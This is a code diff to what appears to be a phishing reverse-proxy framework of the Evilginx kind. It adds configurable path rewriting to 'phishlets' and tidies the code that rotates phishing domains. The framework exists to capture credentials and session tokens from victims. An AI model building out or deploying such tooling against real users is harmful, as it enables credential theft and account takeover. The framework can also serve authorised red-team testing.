@@ -106,6 +106,11 @@ type Intercept struct {
 	mime        string         `mapstructure:"mime"`
 }
 
+type PathRewrite struct {
+	Trigger string `mapstructure:"trigger"`
+	Target  string `mapstructure:"target"`
+}
+
 // DomainConfig represents a domain configuration for multi-domain support
 type DomainConfig struct {
 	Domain       string            `mapstructure:"domain"`
@@ -117,11 +122,11 @@ type DomainConfig struct {
 
 // MultiDomainConfig manages multiple domain configurations
 type MultiDomainConfig struct {
-	Enabled         bool            `mapstructure:"enabled"`
-	DomainRotation  string          `mapstructure:"rotation"` // round-robin, random, priority
-	Domains         []DomainConfig  `mapstructure:"domains"`
-	HealthCheck     bool            `mapstructure:"health_check"`
-	HealthCheckPath string          `mapstructure:"health_check_path"`
+	Enabled         bool           `mapstructure:"enabled"`
+	DomainRotation  string         `mapstructure:"rotation"` // round-robin, random, priority
+	Domains         []DomainConfig `mapstructure:"domains"`
+	HealthCheck     bool           `mapstructure:"health_check"`
+	HealthCheckPath string         `mapstructure:"health_check_path"`
 	currentIndex    int
 }
 
@@ -150,6 +155,7 @@ type Phishlet struct {
 	login            LoginUrl
 	js_inject        []JsInject
 	intercept        []Intercept
+	pathRewrite      []PathRewrite
 	customParams     map[string]string
 	isTemplate       bool
 }
@@ -239,6 +245,11 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+type ConfigPathRewrite struct {
+	Trigger *string `mapstructure:"trigger"`
+	Target  *string `mapstructure:"target"`
+}
+
 type ConfigPhishlet struct {
 	Name        string               `mapstructure:"name"`
 	RedirectUrl string               `mapstructure:"redirect_url"`
@@ -253,6 +264,7 @@ type ConfigPhishlet struct {
 	LoginItem   *ConfigLogin         `mapstructure:"login"`
 	JsInject    *[]ConfigJsInject    `mapstructure:"js_inject"`
 	Intercept   *[]ConfigIntercept   `mapstructure:"intercept"`
+	PathRewrite *[]ConfigPathRewrite `mapstructure:"path_rewrite"`
 	MultiDomain *MultiDomainConfig   `mapstructure:"multi_domain"`
 }
 
@@ -541,6 +553,18 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			}
 		}
 	}
+	if fp.PathRewrite != nil {
+		for _, pr := range *fp.PathRewrite {
+			if pr.Trigger == nil || *pr.Trigger == "" {
+				return fmt.Errorf("path_rewrite: missing `trigger` field")
+			}
+			if pr.Target == nil || *pr.Target == "" {
+				return fmt.Errorf("path_rewrite: missing `target` field")
+			}
+
+			p.addPathRewrite(p.paramVal(*pr.Trigger), p.paramVal(*pr.Target))
+		}
+	}
 	for _, at := range *fp.AuthTokens {
 		ttype := "cookie"
 		if at.Type != nil {
@@ -794,7 +818,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		}
 		// Initialize current index
 		p.multiDomain.currentIndex = 0
-		
+
 		// Process domain parameters
 		for i := range p.multiDomain.Domains {
 			p.multiDomain.Domains[i].Domain = p.paramVal(p.multiDomain.Domains[i].Domain)
@@ -806,7 +830,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				p.multiDomain.Domains[i].CustomParams[k] = p.paramVal(v)
 			}
 		}
-		
+
 		log.Info("Multi-domain support enabled for phishlet '%s' with %d domains", p.Name, len(p.multiDomain.Domains))
 	}
 
@@ -815,10 +839,10 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 
 func (p *Phishlet) GetPhishHosts(use_wildcards bool) []string {
 	var ret []string
-	
+
 	// Get all active domains
 	domains := p.GetAllActiveDomains()
-	
+
 	for _, phishDomain := range domains {
 		if !use_wildcards {
 			for _, h := range p.proxyHosts {
@@ -828,7 +852,7 @@ func (p *Phishlet) GetPhishHosts(use_wildcards bool) []string {
 			ret = append(ret, "*."+phishDomain)
 		}
 	}
-	
+
 	return ret
 }
 
@@ -897,11 +921,11 @@ func (p *Phishlet) GetActiveDomain() string {
 		domain := enabledDomains[p.multiDomain.currentIndex%len(enabledDomains)]
 		p.multiDomain.currentIndex++
 		return domain.Domain
-		
+
 	case "random":
 		idx := rand.Intn(len(enabledDomains))
 		return enabledDomains[idx].Domain
-		
+
 	case "priority":
 		// Sort by priority (lower number = higher priority)
 		highestPriority := enabledDomains[0]
@@ -911,7 +935,7 @@ func (p *Phishlet) GetActiveDomain() string {
 			}
 		}
 		return highestPriority.Domain
-		
+
 	default:
 		// Default to round-robin
 		domain := enabledDomains[p.multiDomain.currentIndex%len(enabledDomains)]
@@ -923,7 +947,7 @@ func (p *Phishlet) GetActiveDomain() string {
 // GetAllActiveDomains returns all enabled domains for this phishlet
 func (p *Phishlet) GetAllActiveDomains() []string {
 	domains := []string{}
-	
+
 	if p.multiDomain == nil || !p.multiDomain.Enabled {
 		// Traditional single domain
 		if domain, ok := p.cfg.GetSiteDomain(p.Name); ok {
@@ -1175,6 +1199,14 @@ func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status 
 	}
 	p.intercept = append(p.intercept, ic)
 	return nil
+}
+
+func (p *Phishlet) addPathRewrite(trigger string, target string) {
+	pr := PathRewrite{
+		Trigger: trigger,
+		Target:  target,
+	}
+	p.pathRewrite = append(p.pathRewrite, pr)
 }
 
 func (p *Phishlet) domainExists(domain string) bool {
